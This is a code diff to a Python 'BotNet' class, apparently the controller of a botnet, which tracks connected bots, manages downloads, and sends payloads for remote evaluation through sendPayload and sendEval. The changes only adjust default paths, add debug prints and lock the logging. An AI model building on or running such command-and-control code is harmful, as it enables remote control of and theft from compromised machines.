@@ -18,6 +18,7 @@ except:
     from botfilemanager import BotNetFileManager
     from botpayloadmanager import BotNetPayloadManager
 
+
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
     PRINTOUT_JSON = 'printout'
@@ -30,7 +31,10 @@ class BotNet(Thread):
     LS_JSON = 'ls'
     FILESIZE_JSON = 'filesize'
 
-    def __init__(self, socketio, payloadpath="payloads", downloadpath="media/downloads"):
+    DEFAULT_PAYLOAD = os.path.join(os.path.dirname(__file__),'payloads')
+    DEFAULT_DOWNLOADPATH = os.path.join(os.path.join(os.path.dirname(__file__),'media'),'downloads')
+
+    def __init__(self, socketio, payloadpath=DEFAULT_PAYLOAD, downloadpath=DEFAULT_DOWNLOADPATH):
         super().__init__()
         self.connlock = threading.Lock()
         self.conncon = threading.Condition(self.connlock)
@@ -38,6 +42,9 @@ class BotNet(Thread):
         self.offlineConnections = {}
         self.logs = {}
         self.socketio = socketio
+
+        print(payloadpath,downloadpath)
+
         self.filemanager = BotNetFileManager(downloadpath)
         self.payloadmanager = BotNetPayloadManager(payloadpath)
         self.downloaddir = downloadpath
@@ -203,8 +210,9 @@ class BotNet(Thread):
                     for filename in fileclose:
                         self.filemanager.closeFile(user, filename)
 
-                except IOError:
+                except IOError as e:
                     # Connection was interrupted, set to offline
+                    print(e)
                     self.setOffline(user)
 
     def getLog(self, user):
@@ -285,7 +293,9 @@ class BotNet(Thread):
     def sendPayload(self, user, payload, args):
         payloadtext = self.payloadmanager.getPayloadText(payload, args)
         if payloadtext:
-            self.logs[user].logstdin("(payload \""+payload+"\")")
+            with self.connlock:
+                if user in self.logs:
+                    self.logs[user].logstdin("(payload \"" + payload + "\")")
             return self.sendEval(user, payloadtext)
         else:
             return False
